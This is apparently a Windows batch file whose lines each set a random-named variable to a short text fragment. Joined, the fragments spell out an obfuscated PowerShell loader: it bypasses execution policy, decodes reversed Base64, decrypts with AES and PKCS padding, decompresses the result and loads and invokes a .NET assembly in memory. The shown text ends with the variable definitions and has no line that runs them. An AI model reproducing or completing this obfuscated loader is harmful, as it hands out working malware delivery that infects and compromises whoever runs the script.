@echo off
set "KoYMImsLDj=t.Pa"
set "TyqzvUyVWy=oryS"
set "yvUxtLDlKq=u) {"
set "PJvmPrLdDZ=.Ass"
set "zRJrTqUhvp=pDZz"
set "fcMqVxGcaz=ne);"
set "dExwxuLRYC=esaB"
set "xmpZagSoPR=Star"
set "EspjGkbCxM=.Dis"
set "RuNqXkZWgu=736u"
set "WKBImOAbQW=Obje"
set "qdTYKDrbNo=Secu"
set "JoQIFgufsZ=$FiD"
set "eysuLcfnOt=esFX"
set "sYwlTKoPVp=:('g"
set "DEoPslSwRT=y.Cr"
set "MYIEqyVAjP=ck($"
set "aEDRIougid=isfL"
set "eZOpuxjzAC=d;$t"
set "KgkumvrUzB=aO);"
set "GQbazUPQrG=ss -"
set "iaEXuLuuVX=bypa"
set "fpSRSqtLHR=);$z"
set "clZJxzxyLl=nLMa"
set "yuxosLxhlp=]::C"
set "aalhOsRfwM=yste"
set "VMWUxvxblG=ZYYc"
set "pdkdcqBOli=;$Fi"
set "RgLlgrLveQ=[Env"
set "bzCnEguwLc=BC;$"
set "cYMPXoKQex=v4Ir"
set "pArSAQRUfx=-1.."
set "xyNFLCftyO=..-1"
set "PvPdfpgOkW=rofi"
set "cSNorGWQCb='[-1"
set "mpOVERdaFh=gMod"
set "KtsxznPcLR= '')"
set "ZiXpquuCoU=$Vho"
set "KmoJRoESWZ=PKCS"
set "HKQQlXWzKn=rt]:"
set "ZCJlEgxskl=New-"
set "zGcbiJthPV=[Sys"
set "sKbHzKUzbd=();$"
set "jyGbXBujoL=Secu"
set "ACcUzGKCus=th('"
set "ntsvsIQKdW=ress"
set "utooxSNRjB=oL'["
set "QgJYzISNHM=);$t"
set "fCwQLeYMsW=yste"
set "oijwzKsusX=h = "
set "bbazsyXOON=am;$"
set "mGfYvqKFFs=]::("
set "yKQHbUAxMx=oin "
set "CBipLOLhIS=;$zK"
set "QGEsFbLUvb=3HWs"
set "SZqIJaZFHX=gnir"
set "zoZOuHXEZW=rity"
set "VetSRNLsSa=-nop"
set "fgplWCzEbk=UGTu"
set "LDHxtECEat=daeR"
set "xkmusSkpYK=gth)"
set "jGHULHtPAp=$Vho"
set "sqESdzGFQw=ect "
set "cIBoJEOeok=;$No"
set "fhINSMEPgx=l = "
set "zjTPyXMdMO=g = "
set "jvGzABSEBv=pStr"
set "ayHHYYkAvu=tS46"
set "djMaLdiqGc=::De"
set "QhceYSOYhk=1..-"
set "LPTKRkuXOk=Fina"
set "QTUPmzpWav=lBlo"
set "tEmHuSMSSj=ose("
set "RtgbAMKenq=Stre"
set "EEEvqQkSDl=n ''"
set "RmUBnoOtTT=$MVx"
set "sDukEQGgOo== $t"
set "PeTpSrNBRj=]::N"
set "esrYDQeeZd=bjec"
set "tkPbjRAJLT= = N"
set "svaxCinfgi=km.T"
set "sHSgwOrSPR=$Vho"
set "ldMIWSVeje=ddin"
set "QJNewIdNKT=r.Su"
set "kPUxkcvILe='txe"
set "xktrRrYOAR='dqR"
set "dLctFcmbov=orF'"
set "RmEyRsfYLJ=cfr."
set "LhsBvPMjzc=Disp"
set "zzTQILtrss=tryP"
set "vTABilRWin=MVxH"
set "fLRBZaMliJ=);$A"
set "mRnFfOjHXj=NoRr"
set "wTzDJHIhws=; };"
set "UDfXiKjtJX=$nLM"
set "ErPcMgxSoV=flec"
set "gGNSNDwqiO=and "
set "ooupPEGBkK=m.IO"
set "vUdJjAaucb=Mkcf"
set "oyrGkQjzCo=ion."
set "UfHAKHUlBG=vj0m"
set "veKrSjaYzd=Comp"
set "eMiNbNTQFG=$tGu"
set "BUdnmTQhqz=V = "
set "TVSqeiUvdQ=[]] "
set "JHtDJJtyPw=ddin"
set "yNNKmIkiuH=embl"
set "ZlIzPkCBQT=null"
set "YWkrdnlQzL=)) {"
set "sDVwMlUVzY=trea"
set "pZkcnDWBaR=.Cry"
set "DtyVdSHaGi=] -j"
set "PzywtbJWab=$Ewq"
set "FSWXJNelAz=6esa"
set "NWHDvEHQPI=qkm "
set "kmqzCJQqHc=.Cop"
set "XVqyhsjvOA=Fo7l"
